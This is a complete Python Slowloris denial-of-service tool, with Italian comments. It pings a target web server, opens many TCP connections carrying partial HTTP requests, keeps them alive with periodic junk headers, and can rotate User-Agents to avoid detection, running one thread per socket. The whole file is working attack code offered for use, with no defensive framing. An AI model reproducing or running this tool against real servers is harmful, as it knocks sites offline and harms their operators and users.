#!/usr/bin/env python3
import argparse
import logging
from pickle import NONE
import random
import sys
import time
import threading
import subprocess
import socket
import os
from colorama import init

global args

global Host
global Log
global Port
global Num_Sockets
global RandomUserAgent

List_Sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

RESET = '\033[0m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'


# Creazione del parser degli argomenti
parser = argparse.ArgumentParser(description="Attack DoS")

parser.add_argument("host", nargs="?", help="Host Web Server")
parser.add_argument("-log", type=str, help="Attivazione dei Log")
parser.add_argument("-p", "--port", default=80, help="Porta del Web Server, Porta 80 Standard", type=int)
parser.add_argument("-s", "--socket", default=150, help="Socket, Standard 150", type=int)
parser.add_argument("-ua", type=str, help="Randomizza User-Agents per ogni Richiesta")

args = parser.parse_args()

Host = args.host
Log = bool(args.log == 'ON' or args.log == 'on' or args.ua == 'On' or args.log == '1')
Port = args.port
Num_Sockets = args.socket
RandomUserAgent = bool(args.ua == 'ON' or args.ua == 'on' or args.ua == 'On' or args.ua == '1')


def Info():
    log_color = GREEN if Log else RED
    log_status = 'Activate' if Log else 'Deactivate'
    random_ua_color = GREEN if RandomUserAgent else RED
    random_ua_status = 'Activate' if RandomUserAgent else 'Deactivate'
    
    print('\n')
    print(f"IP Host Server", GetStringColorated(Host, GREEN))
    print(f"Port:", GetStringColorated(Port, GREEN))
    print(f"Numbers Sockets:", GetStringColorated(Num_Sockets, GREEN))
    print(f"Random User Agent:", GetStringColorated(random_ua_status, random_ua_color))
    print(f"Log:", GetStringColorated(log_status, log_color))
    print('\n')

def CheckArgs():
    stop_run = False

    if Host == None:
        print(GetStringColorated("\nMissing IP Address...", RED))
        stop_run = True
    else:
        print(GetStringColorated("\nIP Address Check...", YELLOW))
        ping = Ping(Host, False)
        print(GetStringColorated("\nCorrect Address", GREEN) if ping else GetStringColorated("\nIncorrect Address", RED))
        if ping:
            print(GetStringColorated("\nPort Check...", YELLOW))
            if Port < 0 or Port > 65535:
                print(GetStringColorated("\nIncorrect Port", RED))
                stop_run = True
            else:
                print(GetStringColorated("\nCorrect Port", GREEN))
        else:
            stop_run = True

    Info()

    if stop_run:
        sys.exit(1)

def Ping(host, show_output=True):
    try:
        if (show_output):
            subprocess.run(["ping", Host], check=True)
        else:
            subprocess.run(["ping", Host], stdout=subprocess.PIPE, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def GetStringColorated(string, Color):
    return f'{Color}{string}{RESET}'

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

def CreateSocket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((Host, Port))
    s.settimeout(6)

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if RandomUserAgent:
        ua = random.choice(user_agents)
    
    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    
    return s

def SlowlorisIteration():
    print("Sending keep-alive headers...")
    print("Socket count: %s" % GetStringColorated(len(List_Sockets), YELLOW))

    for s in list(List_Sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            List_Sockets.remove(s)

    diff = Num_Sockets - len(List_Sockets)

    if diff <= 0:
        return

    print("Creating %s new sockets..." % GetStringColorated(diff, YELLOW))
    

    for _ in range(diff):
        try:
            s = CreateSocket()
            if not s:
                continue
            print("Creating socket %s" % GetStringColorated(str(Num_Sockets - diff + _ + 1), YELLOW))
            List_Sockets.append(s)
        except socket.error as e:
            print("Failed to create new socket: %s" % GetStringColorated(e, RED))
            break

def Attack_DoS():
    while True:
        try:
            SlowlorisIteration()
        except (KeyboardInterrupt, SystemExit):
            print("Stopping Slowloris")
            break
        except Exception as e:
            print("Error in Slowloris iteration: %s" % e)

def main():
    CheckArgs()

    print("Attacking %s with %s sockets." % (GetStringColorated(Host, GREEN), GetStringColorated(Num_Sockets, GREEN)))

    print("Creating sockets...")

    time.sleep(3)

    for _ in range(Num_Sockets):
        try:
            print("Creating socket %s" % GetStringColorated(_, YELLOW))
            s = CreateSocket()
        except socket.error as e:
            print(e)
            break

        List_Sockets.append(s)

    # Creare un elenco di thread
    threads = []

    # Avviare un thread per ogni attacco
    for _ in range(Num_Sockets):
        thread = threading.Thread(target=Attack_DoS)
        thread.start()
        threads.append(thread)

    # Attendere che tutti i thread abbiano completato l'attacco
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    init(autoreset=True)
    main()
